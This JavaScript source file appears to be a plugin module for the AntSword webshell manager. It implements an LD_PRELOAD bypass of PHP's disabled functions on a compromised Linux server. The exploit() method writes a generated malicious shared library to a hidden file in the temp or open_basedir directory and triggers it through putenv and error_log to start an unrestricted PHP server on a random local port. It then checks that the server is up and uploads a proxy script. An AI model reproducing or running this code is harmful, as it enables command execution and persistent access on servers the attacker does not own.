'use strict';

const Base = require('../base');
const LANG = require('../../language'); // 插件语言库
const LANG_T = antSword['language']['toastr']; // 通用通知提示

let LD_PRELOAD_LANG = LANG['core']['ld_preload'];

class LD_PRELOAD extends Base {
  /**
   * 
   * @param {dhtmlxObject} cell 组件
   * @param {Object} top 上层对象
   */
  constructor(cell, top) {
    super(cell, top);
    if(this.precheck() == false) {
      return;
    }
    this.form = this.createForm(this.cell);
  }

  // 提前检测
  precheck() {
    let self = this;
    let infodata = self.top.infodata;
    if (infodata.os.toLowerCase() !== "linux" ) {
      toastr.error(LANG['precheck']['only_linux'], LANG_T['error']);
      return false;
    }
    return true;
  }

  createForm(cell) {
    let form = cell.attachForm([{
      type: 'settings',
      position: 'label-left',
      labelWidth: 100,
      inputWidth: 300,
    }, {
      type: 'block',
      inputWidth: 'auto',
      list: [
        { type: 'label', label: LD_PRELOAD_LANG['title']},
        { type: 'combo', label: LD_PRELOAD_LANG['form']['phpbinary'], labelWidth: 300, name: 'phpbinary', required: true,
          options: (() => {
            let vals = [
              'php',
              'php.exe',
              '/usr/bin/php',
              'C:/php/php.exe'
            ];
            let ret = [];
            vals.map((_) => {
              ret.push({
                text: _,
                value: _
              });
            });
            return ret;
          })()
        }
      ]},
    {
      type: 'block',
      labelWidth: 100,
      inputWidth: 'auto',
      className: "display: flex;flex-direction: row;align-items: center;",
      list: [{
        type: 'label',
        label: '',
        name: 'status_label'
      }, {
        type: 'newcolumn',
        offset: 20
      }, {
        type: 'label',
        label: '',
        name: 'status_msg'
      }, ]
    }], true);
    return form;
  }

  // 执行EXP, 必须有这个函数
  exploit() {
    let self = this;
    let port = Math.floor(Math.random() * 5000) + 60000; // 60000~65000
    if(self.form.validate()){
      self.cell.progressOn();
      let core = self.top.core;
      let formvals = self.form.getValues();
      let phpbinary = formvals['phpbinary'];
      // 生成 ext
      let wdir = "";
      if(self.isOpenBasedir) {
        for(var v in self.top.infodata.open_basedir) {
          if(self.top.infodata.open_basedir[v] == 1) {
            if (v == self.top.infodata.phpself) {
              wdir = v;
            }else{
              wdir = v;
            }
            break;
          }
        };
      }else{
        wdir = self.top.infodata.temp_dir;
      }
      let cmd = `${phpbinary} -n -S 127.0.0.1:${port} -t ${self.top.infodata.phpself}`;
      let fileBuffer = self.generateExt(cmd);
      if(!fileBuffer) {
        toastr.warning(LD_PRELOAD_LANG['msg']['genext_err'], LANG_T["warning"]);
        self.cell.progressOff();
        return
      }
      
      new Promise((res, rej) => {
        var ext_path = `${wdir}/.${String(Math.random()).substr(2, 5)}${self.ext_name}`;
        // 上传 ext
        core.request(
          core.filemanager.upload_file({
            path: ext_path,
            content: fileBuffer
          })
        ).then((response) => {
          var ret = response['text'];
          if (ret === '1') {
            res(ext_path);
          }else{
            rej("upload extension fail");
          }
        }).catch((err) => {
          rej(err)
        });
      }).then((p) => {
        // 触发 payload, 会超时
        var payload = `error_reporting(E_ALL);putenv("LD_PRELOAD=${p}");error_log("a", 1);echo(1);`;
        core.request({
          _: payload,
        }).then((response)=>{

        }).catch((err)=>{
          // 超时也是正常
        })
      }).then(()=>{
        // 验证是否成功开启
        var payload = `sleep(1);
          $fp = @fsockopen("127.0.0.1", ${port}, $errno, $errstr, 1);
          if(!$fp){
            echo(0);
          }else{
            echo(1);
            @fclose($fp);
          };`
          core.request({
            _: payload,
          }).then((response)=>{
            var ret = response['text'];
            if (ret === '1') {
              toastr.success(LANG['success'], LANG_T['success']);
              self.uploadProxyScript("127.0.0.1", port);
              self.cell.progressOff();
            }else{
              throw("exploit fail");
            } 
          }).catch((err)=>{
            throw(err)
          })
      }).catch((err)=>{
        self.cell.progressOff();
        toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
      });
    }else{
      toastr.warning(LANG['form_not_comp'], LANG_T["warning"]);
    }
    return;
  }
}
module.exports = LD_PRELOAD;